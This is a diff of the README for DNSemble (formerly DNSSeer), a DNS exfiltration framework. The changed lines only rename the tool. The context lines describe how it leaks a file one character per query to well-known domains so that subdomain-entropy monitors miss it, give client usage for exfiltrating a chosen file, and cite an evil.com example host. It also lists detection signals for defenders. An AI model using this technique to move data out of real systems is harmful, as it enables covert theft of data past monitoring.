@@ -1,4 +1,4 @@
-# DNSSeer
+# DNSemble
 
 **DNS Exfiltration Framework** -- The domain IS the data.
 
@@ -45,7 +45,7 @@ Traditional DNS exfiltration encodes data in **subdomains** --
 `c3VwZXJzZWNyZXQ.evil.com` -- which is trivially detected by
 any DNS monitor looking for high-entropy labels.
 
-DNSSeer takes a fundamentally different approach:
+DNSemble takes a fundamentally different approach:
 
 ```
 Infected Machine                          Attacker DNS Server
@@ -75,7 +75,7 @@ asked about.
 
 ### The Core Idea
 
-DNSSeer maps 98 well-known domains to 98 characters (95 printable ASCII
+DNSemble maps 98 well-known domains to 98 characters (95 printable ASCII
 plus `\n`, `\t`, `\r`).  To exfiltrate the character `'S'`, the client
 queries whichever domain currently maps to `'S'`.  The server sees the
 domain, looks up the character, and appends it to the reconstructed file.
@@ -205,7 +205,7 @@ The client actually resolves every domain it queries.
 ### File Structure
 
 ```
-DNSSeer/
+DNSemble/
   domains.py    Shared protocol: domain pool, character set,
                 DNS wire-format helpers, permutation generation,
                 TX ID encoding, control codes
@@ -363,7 +363,7 @@ python3 client.py -s SERVER -f FILE [-p PORT] [-c ID] [-d DELAY] [-j JITTER] [-v
 
 | Argument | Default | Description |
 |---|---|---|
-| `-s, --server` | (required) | DNSSeer server IP address |
+| `-s, --server` | (required) | DNSemble server IP address |
 | `-f, --file` | (required) | Path to the file to exfiltrate |
 | `-p, --port` | `5353` | Server UDP port |
 | `-c, --client-id` | random 1-255 | Client identifier (0-255) |
@@ -403,11 +403,11 @@ API_KEY=sk-1337-s3cr3t
 ```
 $ python3 server.py
 
-    ____  _   _______ _____
-   / __ \/ | / / ___// ___/___  ___  _____
-  / / / /  |/ /\__ \ \__ \/ _ \/ _ \/ ___/
- / /_/ / /|  /___/ /___/ /  __/  __/ /
-/_____/_/ |_//____//____/\___/\___/_/
+    ____  _   _____                 __    __
+   / __ \/ | / / ___/___  ____ ___  / /_  / /__
+  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
+ / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
+/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/
 
   DNS Exfiltration Framework  ·  v1.0
   The domain IS the data.  Dynamic mapping.
@@ -641,7 +641,7 @@ other than `\n`/`\t`/`\r`) are silently skipped with a warning.
 
 ## Detection Considerations
 
-DNSSeer is designed for **authorized penetration testing** and
+DNSemble is designed for **authorized penetration testing** and
 **security research**.  Understanding the detection surface helps
 defenders build better monitoring:
 
@@ -664,7 +664,7 @@ defenders build better monitoring:
 - **Repeated googleapis.com**: Multiple A queries for googleapis.com
   with unusual TX ID patterns could stand out under deep inspection.
 - **AAAA/MX distribution**: Legitimate traffic has a very low ratio
-  of AAAA and MX queries compared to A queries.  DNSSeer's hostname
+  of AAAA and MX queries compared to A queries.  DNSemble's hostname
   and filename phases invert this ratio temporarily.
 - **No follow-up connections**: Resolving google.com but never
   connecting to 142.250.x.x is suspicious to behavioral analysis.
